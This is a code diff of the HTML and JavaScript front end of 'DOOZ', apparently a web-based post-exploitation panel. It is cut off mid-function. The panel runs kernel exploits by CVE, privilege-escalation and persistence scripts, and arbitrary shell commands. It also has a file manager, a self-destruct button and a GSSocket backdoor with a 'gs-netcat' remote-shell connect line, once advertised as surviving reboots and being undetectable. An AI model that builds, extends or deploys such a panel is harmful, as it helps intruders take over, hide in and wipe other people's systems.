@@ -1,234 +1,223 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>dz</title>
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>DZ</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
 <style>
-@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&display=swap');
 *{margin:0;padding:0;box-sizing:border-box}
-:root{--bg:#05060a;--glass:rgba(255,255,255,0.02);--glass2:rgba(255,255,255,0.04);--border:rgba(255,255,255,0.06);--text:#a8adb8;--text2:#4a4f5c;--accent:#c9a227;--green:#2dd4a0;--red:#f43f5e;--glow:rgba(201,162,39,0.15)}
-body{font-family:'JetBrains Mono',monospace;background:var(--bg);color:var(--text);min-height:100vh;font-size:11px;overflow-x:hidden}
-body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.1) 2px,rgba(0,0,0,0.1) 4px),radial-gradient(ellipse at 50% 0%,rgba(201,162,39,0.03) 0%,transparent 60%);pointer-events:none;z-index:9999}
-.c{max-width:900px;margin:0 auto;padding:16px}
-header{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid var(--border);margin-bottom:16px}
-.logo{font-size:14px;font-weight:600;color:var(--accent);letter-spacing:2px;text-transform:uppercase}
-.logo span{color:var(--text2);font-weight:400;font-size:9px;margin-left:6px}
-.st{display:flex;align-items:center;gap:6px;font-size:9px;color:var(--green)}
-.st i{width:6px;height:6px;background:var(--green);border-radius:50%;animation:pulse 2s infinite}
-@keyframes pulse{0%,100%{opacity:1;box-shadow:0 0 8px var(--green)}50%{opacity:.5}}
-nav{display:flex;gap:1px;background:var(--glass);border:1px solid var(--border);border-radius:4px;padding:2px}
-nav a{color:var(--text2);padding:6px 12px;font-size:9px;text-transform:uppercase;letter-spacing:1px;cursor:pointer;border-radius:3px;transition:all .2s}
-nav a:hover{color:var(--text)}
-nav a.on{color:var(--accent);background:var(--glass2)}
-.grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
-.card{background:linear-gradient(135deg,var(--glass) 0%,transparent 100%);border:1px solid var(--border);border-radius:6px;padding:14px;position:relative;overflow:hidden}
-.card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--accent),transparent);opacity:.3}
-.card.full{grid-column:1/-1}
-.card h3{font-size:8px;font-weight:500;text-transform:uppercase;letter-spacing:2px;color:var(--text2);margin-bottom:12px}
-.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:6px}
-.stat{background:var(--glass);border:1px solid var(--border);padding:8px;border-radius:4px}
-.stat-l{font-size:8px;color:var(--text2);text-transform:uppercase;letter-spacing:1px;margin-bottom:2px}
-.stat-v{font-size:10px;color:var(--text);word-break:break-all}
-.term{background:#000;border:1px solid var(--border);border-radius:4px;padding:10px;min-height:150px;max-height:250px;overflow-y:auto;position:relative}
-.term::before{content:'';position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 1px,rgba(0,0,0,0.3) 1px,rgba(0,0,0,0.3) 2px);pointer-events:none;opacity:.5}
-.term::-webkit-scrollbar{width:4px}
-.term::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
-.term .ln{margin:2px 0;line-height:1.5;position:relative;padding-left:16px;opacity:0;animation:fadeIn .3s forwards}
-.term .ln::before{content:'›';position:absolute;left:0;color:var(--accent);opacity:.5}
-.term .cmd{color:var(--accent)}
-.term .ok{color:var(--green)}
-.term .err{color:var(--red)}
-.term .info{color:var(--text2)}
-@keyframes fadeIn{to{opacity:1}}
-.exp{display:flex;align-items:center;padding:10px;background:var(--glass);border:1px solid var(--border);border-radius:4px;margin-bottom:6px;cursor:pointer;transition:all .2s;position:relative;overflow:hidden}
-.exp:hover{border-color:var(--accent);box-shadow:0 0 20px var(--glow)}
-.exp::after{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(201,162,39,0.1),transparent);transition:left .5s}
-.exp:hover::after{left:100%}
-.exp-cve{font-size:10px;font-weight:600;width:110px;color:var(--accent)}
+:root{--bg:#030305;--panel:#0a0b0f;--glass:rgba(255,255,255,0.015);--glass2:rgba(255,255,255,0.03);--border:rgba(255,255,255,0.04);--border2:rgba(255,255,255,0.08);--text:#8a8f9a;--text2:#4a4e5a;--gold:#c9a227;--gold2:#a68520;--green:#10b981;--red:#ef4444;--blue:#3b82f6;--glow:rgba(201,162,39,0.08)}
+html,body{height:100%}
+body{font-family:'JetBrains Mono',monospace;background:var(--bg);color:var(--text);font-size:11px;overflow:hidden}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent 0px,transparent 2px,rgba(0,0,0,0.15) 2px,rgba(0,0,0,0.15) 4px);pointer-events:none;z-index:10000}
+body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 30% 0%,rgba(201,162,39,0.03),transparent 50%),radial-gradient(ellipse at 70% 100%,rgba(16,185,129,0.02),transparent 50%);pointer-events:none}
+.app{display:grid;grid-template-columns:200px 1fr 280px;grid-template-rows:50px 1fr;height:100vh;gap:1px;background:var(--border)}
+header{grid-column:1/-1;background:var(--panel);display:flex;align-items:center;justify-content:space-between;padding:0 20px;border-bottom:1px solid var(--border)}
+.logo{font-size:16px;font-weight:600;color:var(--gold);letter-spacing:4px}
+.logo span{font-size:9px;color:var(--text2);font-weight:300;margin-left:8px;letter-spacing:1px}
+.hdr-r{display:flex;align-items:center;gap:16px}
+.gs-badge{display:flex;align-items:center;gap:6px;background:var(--glass2);border:1px solid var(--border2);padding:6px 12px;border-radius:4px;font-size:9px}
+.gs-badge i{width:6px;height:6px;background:var(--green);border-radius:50%;box-shadow:0 0 10px var(--green);animation:pulse 2s infinite}
+@keyframes pulse{50%{opacity:.4}}
+.gs-key{color:var(--gold);font-weight:500}
+aside{background:var(--panel);padding:12px;overflow-y:auto}
+nav a{display:flex;align-items:center;gap:10px;padding:10px 12px;color:var(--text2);text-decoration:none;border-radius:4px;margin-bottom:2px;transition:all .15s;font-size:10px;letter-spacing:1px;text-transform:uppercase}
+nav a:hover{background:var(--glass);color:var(--text)}
+nav a.on{background:linear-gradient(90deg,var(--glow),transparent);color:var(--gold);border-left:2px solid var(--gold)}
+nav a svg{width:14px;height:14px;opacity:.5}
+nav a.on svg{opacity:1}
+.nav-sep{height:1px;background:var(--border);margin:12px 0}
+main{background:var(--bg);padding:16px;overflow-y:auto}
+.panel{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:16px;margin-bottom:12px;position:relative}
+.panel::before{content:'';position:absolute;top:0;left:20px;right:20px;height:1px;background:linear-gradient(90deg,transparent,var(--gold),transparent);opacity:.2}
+.panel h2{font-size:9px;font-weight:500;color:var(--text2);letter-spacing:2px;text-transform:uppercase;margin-bottom:14px;display:flex;align-items:center;gap:8px}
+.panel h2::before{content:'';width:4px;height:4px;background:var(--gold);border-radius:1px}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:8px}
+.stat{background:var(--glass);border:1px solid var(--border);border-radius:4px;padding:10px}
+.stat-l{font-size:8px;color:var(--text2);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px}
+.stat-v{font-size:11px;color:var(--text);word-break:break-all}
+.exp{display:flex;align-items:center;padding:12px;background:var(--glass);border:1px solid var(--border);border-radius:4px;margin-bottom:6px;cursor:pointer;transition:all .2s;position:relative;overflow:hidden}
+.exp:hover{border-color:var(--gold);transform:translateX(4px)}
+.exp::before{content:'';position:absolute;left:0;top:0;bottom:0;width:2px;background:var(--gold);opacity:0;transition:opacity .2s}
+.exp:hover::before{opacity:1}
+.exp-cve{font-size:10px;font-weight:600;width:120px;color:var(--gold)}
 .exp-nm{flex:1;color:var(--text2);font-size:9px}
 .exp-rt{font-size:10px;font-weight:600;width:40px;text-align:right}
-.exp-bar{width:60px;height:4px;background:var(--glass2);border-radius:2px;margin-left:8px;overflow:hidden;position:relative}
-.exp-bar i{display:block;height:100%;border-radius:2px;position:relative}
-.exp-bar i::after{content:'';position:absolute;inset:0;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.3),transparent);animation:shimmer 2s infinite}
-@keyframes shimmer{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
-.irow{display:flex;gap:6px;margin-top:10px}
-.irow input{flex:1;background:var(--glass);border:1px solid var(--border);color:var(--text);padding:10px;border-radius:4px;font-family:inherit;font-size:11px;outline:none}
-.irow input:focus{border-color:var(--accent);box-shadow:0 0 10px var(--glow)}
-.btn{background:linear-gradient(135deg,var(--accent),#a68520);color:#000;border:none;padding:10px 16px;border-radius:4px;font-family:inherit;font-size:9px;font-weight:600;text-transform:uppercase;letter-spacing:1px;cursor:pointer;transition:all .2s}
+.exp-bar{width:80px;height:3px;background:var(--glass2);border-radius:2px;margin-left:12px;overflow:hidden}
+.exp-bar i{display:block;height:100%;border-radius:2px}
+.term{background:#000;border:1px solid var(--border);border-radius:4px;font-size:10px;height:100%;min-height:200px;overflow:hidden;display:flex;flex-direction:column}
+.term-head{background:var(--glass);padding:8px 12px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px;font-size:9px;color:var(--text2)}
+.term-dot{width:8px;height:8px;border-radius:50%;background:var(--red)}
+.term-dot:nth-child(2){background:var(--gold)}
+.term-dot:nth-child(3){background:var(--green)}
+.term-body{flex:1;padding:12px;overflow-y:auto;line-height:1.6}
+.term-body::-webkit-scrollbar{width:4px}
+.term-body::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+.ln{opacity:0;animation:fadeIn .2s forwards;padding-left:16px;position:relative;margin:1px 0}
+.ln::before{content:'›';position:absolute;left:0;color:var(--gold);opacity:.4}
+.ln.cmd{color:var(--gold)}
+.ln.cmd::before{content:'$'}
+.ln.ok{color:var(--green)}
+.ln.ok::before{content:'✓';color:var(--green)}
+.ln.err{color:var(--red)}
+.ln.err::before{content:'✗';color:var(--red)}
+.ln.info{color:var(--text2)}
+@keyframes fadeIn{to{opacity:1}}
+.term-input{display:flex;border-top:1px solid var(--border);background:var(--glass)}
+.term-input input{flex:1;background:transparent;border:none;color:var(--text);padding:10px 12px;font-family:inherit;font-size:10px;outline:none}
+.term-input button{background:var(--gold);color:#000;border:none;padding:0 16px;font-family:inherit;font-size:9px;font-weight:600;cursor:pointer;letter-spacing:1px}
+.sidebar{background:var(--panel);padding:12px;overflow-y:auto;border-left:1px solid var(--border)}
+.fm{height:100%;display:flex;flex-direction:column}
+.fm-head{padding-bottom:10px;border-bottom:1px solid var(--border);margin-bottom:10px}
+.fm-path{font-size:9px;color:var(--text2);display:flex;flex-wrap:wrap;gap:4px}
+.fm-path a{color:var(--gold);text-decoration:none}
+.fm-path a:hover{text-decoration:underline}
+.fm-list{flex:1;overflow-y:auto}
+.fm-item{display:flex;align-items:center;padding:8px;border-radius:4px;cursor:pointer;transition:all .1s;border:1px solid transparent}
+.fm-item:hover{background:var(--glass);border-color:var(--border)}
+.fm-item.sel{background:var(--glow);border-color:var(--gold)}
+.fm-icon{width:28px;height:28px;display:flex;align-items:center;justify-content:center;background:var(--glass);border-radius:4px;margin-right:10px;font-size:12px}
+.fm-icon.dir{background:rgba(201,162,39,0.1);color:var(--gold)}
+.fm-info{flex:1;min-width:0}
+.fm-name{font-size:10px;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.fm-meta{font-size:8px;color:var(--text2);margin-top:2px}
+.fm-preview{background:var(--glass);border:1px solid var(--border);border-radius:4px;padding:10px;margin-top:10px;max-height:150px;overflow:auto;font-size:9px;white-space:pre-wrap;word-break:break-all}
+.progress{height:2px;background:var(--glass2);border-radius:1px;overflow:hidden;margin:8px 0}
+.progress i{height:100%;background:linear-gradient(90deg,var(--gold),var(--green));transition:width .3s}
+.scan-log{max-height:120px;overflow-y:auto;margin-top:8px}
+.btn{background:linear-gradient(135deg,var(--gold),var(--gold2));color:#000;border:none;padding:8px 16px;border-radius:4px;font-family:inherit;font-size:9px;font-weight:600;cursor:pointer;letter-spacing:1px;transition:all .2s}
 .btn:hover{box-shadow:0 0 20px var(--glow)}
+.btn-sm{padding:6px 10px;font-size:8px}
 .btn-g{background:var(--glass);border:1px solid var(--border);color:var(--text)}
 .btn-r{background:linear-gradient(135deg,var(--red),#c41d3a);color:#fff}
-.qs{display:flex;flex-wrap:wrap;gap:4px;margin:8px 0}
-.qs span{padding:6px 10px;background:var(--glass);border:1px solid var(--border);border-radius:3px;font-size:9px;color:var(--text2);cursor:pointer;transition:all .2s}
-.qs span:hover{border-color:var(--accent);color:var(--accent)}
-.files{max-height:220px;overflow-y:auto}
-.file{display:flex;align-items:center;padding:8px;border-bottom:1px solid var(--border);cursor:pointer;font-size:10px;transition:all .1s}
-.file:hover{background:var(--glass)}
-.file-i{width:20px;color:var(--accent);opacity:.5}
-.file-n{flex:1}
-.file-s{color:var(--text2);font-size:9px}
-.key{background:#000;border:1px solid var(--border);border-radius:4px;padding:10px;font-size:9px;color:var(--accent);word-break:break-all;cursor:pointer}
+.qs{display:flex;flex-wrap:wrap;gap:4px}
+.qs span{padding:6px 10px;background:var(--glass);border:1px solid var(--border);border-radius:3px;font-size:9px;color:var(--text2);cursor:pointer;transition:all .15s}
+.qs span:hover{border-color:var(--gold);color:var(--gold)}
 .page{display:none}.page.on{display:block}
-.progress{height:3px;background:var(--glass2);border-radius:2px;overflow:hidden;margin:8px 0}
-.progress i{height:100%;background:linear-gradient(90deg,var(--accent),var(--green));border-radius:2px;transition:width .3s;position:relative}
-.log{font-size:9px;color:var(--text2);margin:4px 0;padding-left:12px;position:relative}
-.log::before{content:'▸';position:absolute;left:0;color:var(--accent)}
-.log.ok::before{content:'✓';color:var(--green)}
-.log.err::before{content:'✗';color:var(--red)}
-.scan-box{background:var(--glass);border:1px solid var(--border);border-radius:4px;padding:12px;margin-bottom:12px}
-.scan-title{font-size:10px;color:var(--accent);margin-bottom:8px;display:flex;align-items:center;gap:6px}
-.scan-title i{animation:spin 1s linear infinite}
-@keyframes spin{to{transform:rotate(360deg)}}
-.gs{background:linear-gradient(135deg,rgba(45,212,160,0.1),transparent);border-color:rgba(45,212,160,0.3)}
-@media(max-width:768px){.grid{grid-template-columns:1fr}.stats{grid-template-columns:repeat(2,1fr)}}
+.acts{display:flex;gap:6px;margin-top:12px}
+.key-box{background:#000;border:1px solid var(--border);border-radius:4px;padding:12px;font-size:9px;color:var(--gold);word-break:break-all;cursor:pointer;transition:all .2s}
+.key-box:hover{border-color:var(--gold)}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media(max-width:1000px){.app{grid-template-columns:1fr}.sidebar{display:none}aside{position:fixed;left:-200px}}
 </style></head>
 <body>
-<div class="c">
+<div class="app">
 <header>
-<div class="logo">DOOZ<span>v8.6</span></div>
-<div class="st"><i></i>CONNECTED</div>
+<div class="logo">DOOZ<span>v9.0</span></div>
+<div class="hdr-r">
+<div class="gs-badge"><i></i><span>GSOCKET</span><span class="gs-key" id="gskey">%s</span></div>
+</div>
 </header>
-<nav><a class="on" data-p="main">Main</a><a data-p="exp">Exploit</a><a data-p="scr">Script</a><a data-p="files">Files</a><a data-p="term">Shell</a><a data-p="gs">Persist</a><a data-p="cfg">Cfg</a></nav>
-
-<div id="p-main" class="page on">
-<div class="grid">
-<div class="card"><h3>System</h3><div class="stats" id="sys"></div></div>
-<div class="card"><h3>Control</h3><div class="qs"><span onclick="nav('exp')">⚡ EXPLOIT</span><span onclick="nav('scr')">◎ SCRIPT</span><span onclick="nav('term')">▣ SHELL</span><span onclick="pull()">↻ UPDATE</span><span onclick="nuke()" style="color:var(--red)">✖ NUKE</span></div></div>
-<div class="card full"><h3>Exploit Scanner</h3><div id="scan"></div></div>
+<aside>
+<nav>
+<a class="on" data-p="dash"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg>Dashboard</a>
+<a data-p="exp"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>Exploits</a>
+<a data-p="scr"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><path d="M14 2v6h6M16 13H8M16 17H8M10 9H8"/></svg>Scripts</a>
+<a data-p="term"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>Terminal</a>
+<div class="nav-sep"></div>
+<a data-p="proc"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>Processes</a>
+<a data-p="net"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg>Network</a>
+<div class="nav-sep"></div>
+<a data-p="cfg"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 010 2.83 2 2 0 01-2.83 0l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-2 2 2 2 0 01-2-2v-.09A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83 0 2 2 0 010-2.83l.06-.06a1.65 1.65 0 00.33-1.82 1.65 1.65 0 00-1.51-1H3a2 2 0 01-2-2 2 2 0 012-2h.09A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 010-2.83 2 2 0 012.83 0l.06.06a1.65 1.65 0 001.82.33H9a1.65 1.65 0 001-1.51V3a2 2 0 012-2 2 2 0 012 2v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 0 2 2 0 010 2.83l-.06.06a1.65 1.65 0 00-.33 1.82V9a1.65 1.65 0 001.51 1H21a2 2 0 012 2 2 2 0 01-2 2h-.09a1.65 1.65 0 00-1.51 1z"/></svg>Config</a>
+</nav>
+<div style="margin-top:auto;padding-top:12px;border-top:1px solid var(--border)">
+<button class="btn btn-r btn-sm" style="width:100%" onclick="nuke()">DESTRUCT</button>
+</div>
+</aside>
+<main>
+<div id="p-dash" class="page on">
+<div class="panel"><h2>System Information</h2><div class="stats" id="sys"></div></div>
+<div class="panel"><h2>Exploit Scanner</h2><div id="scan"></div></div>
+<div class="panel"><h2>Quick Actions</h2>
+<div class="qs"><span onclick="nav('exp')">⚡ EXPLOITS</span><span onclick="nav('scr')">◎ SCRIPTS</span><span onclick="nav('term')">▣ TERMINAL</span><span onclick="nav('proc')">◈ PROCESSES</span><span onclick="nav('net')">◉ NETWORK</span><span onclick="pull()">↻ UPDATE</span></div>
 </div>
 </div>
-
-<div id="p-exp" class="page">
-<div class="card"><h3>Kernel Exploits</h3><div id="expl"></div></div>
-</div>
-
+<div id="p-exp" class="page"><div class="panel" style="height:calc(100vh - 120px)"><h2>Kernel Exploits</h2><div id="expl" style="overflow-y:auto;height:calc(100% - 40px)"></div></div></div>
 <div id="p-scr" class="page">
-<div class="card"><h3>Scripts</h3>
-<div class="qs"><span onclick="rs('scripts/sysinfo.sh')">sysinfo</span><span onclick="rs('scripts/recon.sh')">recon</span><span onclick="rs('scripts/privesc.sh')">privesc</span><span onclick="rs('scripts/persist.sh')">persist</span></div>
-<div class="irow"><input id="sp" placeholder="path/to/script.sh"><button class="btn" onclick="rs($('sp').value)">RUN</button></div>
-<div class="term" id="so"></div>
+<div class="panel"><h2>Execute Script</h2>
+<div class="qs" style="margin-bottom:12px"><span onclick="rs('scripts/sysinfo.sh')">sysinfo</span><span onclick="rs('scripts/recon.sh')">recon</span><span onclick="rs('scripts/privesc.sh')">privesc</span><span onclick="rs('scripts/persist.sh')">persist</span></div>
+<div style="display:flex;gap:8px"><input id="sp" style="flex:1;background:var(--glass);border:1px solid var(--border);color:var(--text);padding:10px;border-radius:4px;font-family:inherit" placeholder="scripts/example.sh"><button class="btn" onclick="rs($('sp').value)">RUN</button></div>
 </div>
+<div class="panel" style="height:calc(100vh - 240px)"><h2>Output</h2><div class="term" style="height:calc(100% - 30px)"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><span style="margin-left:auto">script output</span></div><div class="term-body" id="so"></div></div></div>
 </div>
-
-<div id="p-files" class="page">
-<div class="card"><h3>Files</h3><div id="bc" style="font-size:9px;color:var(--text2);margin-bottom:8px;padding-bottom:8px;border-bottom:1px solid var(--border)"></div><div class="files" id="fls"></div></div>
-</div>
-
-<div id="p-term" class="page">
-<div class="card"><h3>Shell</h3><div class="term" id="to"></div><div class="irow"><input id="tc" placeholder="$ command" onkeydown="event.key==='Enter'&&rc()"><button class="btn" onclick="rc()">EXEC</button></div></div>
-</div>
-
-<div id="p-gs" class="page">
-<div class="card gs"><h3>⚡ GSSocket Persistence</h3>
-<p style="color:var(--text2);font-size:10px;margin-bottom:12px">Hidden encrypted tunnel • Survives reboots • Undetectable</p>
-<div class="term" id="gso"></div>
-<div class="irow"><input id="gsk" placeholder="secret-key (leave empty for auto)"><button class="btn" onclick="gsInstall()">INSTALL</button><button class="btn btn-g" onclick="gsStatus()">STATUS</button></div>
-</div>
-</div>
-
+<div id="p-term" class="page"><div class="panel" style="height:calc(100vh - 100px)"><h2>Shell</h2><div class="term" style="height:calc(100% - 30px)"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><span style="margin-left:auto">bash</span></div><div class="term-body" id="to"></div><div class="term-input"><input id="tc" placeholder="$ enter command" onkeydown="event.key==='Enter'&&rc()"><button onclick="rc()">EXEC</button></div></div></div></div>
+<div id="p-proc" class="page"><div class="panel" style="height:calc(100vh - 100px)"><h2>Processes</h2><div class="term" style="height:calc(100% - 30px)"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><span style="margin-left:auto">ps aux</span></div><div class="term-body" id="po"></div></div></div></div>
+<div id="p-net" class="page"><div class="panel" style="height:calc(100vh - 100px)"><h2>Network</h2><div class="term" style="height:calc(100% - 30px)"><div class="term-head"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><span style="margin-left:auto">connections</span></div><div class="term-body" id="no"></div></div></div></div>
 <div id="p-cfg" class="page">
-<div class="grid">
-<div class="card"><h3>Deploy Key</h3><div class="key" id="dk" onclick="navigator.clipboard.writeText(this.innerText)">%s</div></div>
-<div class="card"><h3>Tunnel</h3><div class="stat"><div class="stat-l">URL</div><div class="stat-v" id="curl" style="color:var(--accent)">-</div></div></div>
+<div class="grid2">
+<div class="panel"><h2>Deploy Key</h2><div class="key-box" onclick="navigator.clipboard.writeText(this.innerText)">%s</div></div>
+<div class="panel"><h2>GSSocket</h2><div class="key-box" id="gs2">-</div><p style="margin-top:8px;font-size:9px;color:var(--text2)">Connect: <code style="color:var(--gold)">gs-netcat -s KEY -p 8888</code></p></div>
+</div>
+<div class="panel"><h2>Actions</h2><div class="acts"><button class="btn" onclick="pull()">↻ UPDATE REPO</button><button class="btn btn-g" onclick="rc2('id;whoami;pwd')">WHOAMI</button><button class="btn btn-r" onclick="nuke()">DESTRUCT</button></div></div>
+</div>
+</div>
+<div class="sidebar">
+<div class="fm">
+<div class="fm-head"><h2 style="font-size:9px;color:var(--text2);letter-spacing:2px;margin-bottom:8px">FILE MANAGER</h2><div class="fm-path" id="bc"></div></div>
+<div class="fm-list" id="fls"></div>
+<div id="fpreview"></div>
 </div>
 </div>
 </div>
-
 <script>
 const $=s=>document.getElementById(s);
-const api=async(e,d)=>{try{const r=await fetch('/api/'+e,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d||{})});return r.json();}catch(e){return{error:e.message}}};
+const api=async(e,d)=>{try{return(await fetch('/api/'+e,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d||{})})).json();}catch(e){return{error:e.message}}};
 const log=(el,t,c='')=>{const d=document.createElement('div');d.className='ln '+c;d.textContent=t;$(el).appendChild(d);$(el).scrollTop=1e9;};
-const nav=p=>{document.querySelectorAll('.page').forEach(x=>x.classList.remove('on'));document.querySelectorAll('nav a').forEach(x=>x.classList.remove('on'));$('p-'+p).classList.add('on');document.querySelector(`nav a[data-p=${p}]`).classList.add('on');if(p==='exp')scan();if(p==='files')ls(cwd);if(p==='cfg')cfg();};
+const clear=el=>$(el).innerHTML='';
+const nav=p=>{document.querySelectorAll('.page').forEach(x=>x.classList.remove('on'));document.querySelectorAll('nav a').forEach(x=>x.classList.remove('on'));$('p-'+p).classList.add('on');document.querySelector(`nav a[data-p=${p}]`)?.classList.add('on');
+if(p==='exp')scan();if(p==='proc')loadProc();if(p==='net')loadNet();if(p==='cfg'){$('gs2').innerText=$('gskey').innerText;}};
 document.querySelectorAll('nav a').forEach(a=>a.onclick=()=>nav(a.dataset.p));
 let cwd='/';
-
 async function init(){
 $('sys').innerHTML='<div class="stat"><div class="stat-v" style="color:var(--text2)">Loading...</div></div>';
 const s=await api('run',{path:'scripts/sysinfo.sh'});
-let h='';
-try{const d=JSON.parse(s.output||'{}');
-for(const[k,v]of Object.entries(d)){h+=`<div class="stat"><div class="stat-l">${k}</div><div class="stat-v">${v}</div></div>`;}}
-catch(e){h=`<div class="stat"><div class="stat-v" style="color:var(--red)">${s.output||s.error||'Error'}</div></div>`;}
-$('sys').innerHTML=h;
-scanInit();
+try{const d=JSON.parse(s.output||'{}');let h='';for(const[k,v]of Object.entries(d))h+=`<div class="stat"><div class="stat-l">${k}</div><div class="stat-v">${v}</div></div>`;$('sys').innerHTML=h;}
+catch(e){$('sys').innerHTML=`<div class="stat"><div class="stat-v" style="color:var(--red)">${s.output||'Error'}</div></div>`;}
+scanInit();ls(cwd);
 }
-
 async function scanInit(){
-$('scan').innerHTML=`<div class="scan-box"><div class="scan-title"><i>◐</i> Scanning kernel vulnerabilities...</div><div class="progress"><i style="width:0%"></i></div><div id="slog"></div></div>`;
-const steps=['Checking kernel version...','Analyzing SUID binaries...','Scanning capabilities...','Checking writable files...','Finalizing...'];
-for(let i=0;i<steps.length;i++){
-log('slog',steps[i],'info');
-$('scan').querySelector('.progress i').style.width=((i+1)/steps.length*100)+'%';
-await new Promise(r=>setTimeout(r,300));
-}
-const r=await api('run',{path:'exploits/gate.sh'});
-try{
-const d=JSON.parse(r.output||'{}');
-$('scan').querySelector('.scan-title').innerHTML='✓ Scan complete';
-if(d.exploits?.length){
-let h='';for(const x of d.exploits){
-const c=x.rate>=80?'var(--green)':x.rate>=50?'var(--accent)':'var(--red)';
-log('slog',`Found: ${x.cve} - ${x.name} [${x.rate}%]`,'ok');
-h+=`<div class="exp" onclick="runE('${x.cve}')"><span class="exp-cve">${x.cve}</span><span class="exp-nm">${x.name}</span><span class="exp-rt" style="color:${c}">${x.rate}%</span><div class="exp-bar"><i style="width:${x.rate}%;background:${c}"></i></div></div>`;
-}
-$('scan').innerHTML+=h;
-}else{log('slog','No exploits found for this kernel','err');}
-}catch(e){$('scan').innerHTML=`<div style="color:var(--red)">${r.output||r.error}</div>`;}
-}
-
-async function scan(){
-$('expl').innerHTML=`<div class="scan-box"><div class="scan-title"><i>◐</i> Loading...</div></div>`;
+$('scan').innerHTML=`<div class="progress"><i id="sprog" style="width:0%"></i></div><div class="scan-log" id="slog"></div>`;
+const steps=['Checking kernel...','Scanning SUID...','Analyzing capabilities...','Checking permissions...','Complete'];
+for(let i=0;i<steps.length;i++){log('slog',steps[i],'info');$('sprog').style.width=((i+1)/steps.length*100)+'%';await new Promise(r=>setTimeout(r,200));}
 const r=await api('run',{path:'exploits/gate.sh'});
 try{const d=JSON.parse(r.output||'{}');
-if(d.exploits?.length){let h='';for(const x of d.exploits){const c=x.rate>=80?'var(--green)':x.rate>=50?'var(--accent)':'var(--red)';h+=`<div class="exp" onclick="runE('${x.cve}')"><span class="exp-cve">${x.cve}</span><span class="exp-nm">${x.name}</span><span class="exp-rt" style="color:${c}">${x.rate}%</span><div class="exp-bar"><i style="width:${x.rate}%;background:${c}"></i></div></div>`;}$('expl').innerHTML=h;}
-else $('expl').innerHTML='<div style="color:var(--text2)">No exploits available</div>';}
-catch(e){$('expl').innerHTML=`<div style="color:var(--red)">${r.output}</div>`;}}
-
-async function runE(cve){if(!confirm('Execute '+cve+'?'))return;
-$('expl').innerHTML=`<div class="scan-box"><div class="scan-title"><i>◐</i> Running ${cve}...</div><div class="progress"><i style="width:50%"></i></div></div>`;
-const r=await api('run',{path:'exploits/'+cve+'/run.sh'});alert(r.output||'Done');scan();}
-
-async function rs(p){if(!p)return;$('so').innerHTML='';log('so','$ '+p,'cmd');const r=await api('run',{path:p});(r.output||'').split('\n').forEach(l=>log('so',l,'ok'));}
-
-async function ls(p){cwd=p;const d=await api('files',{path:p});
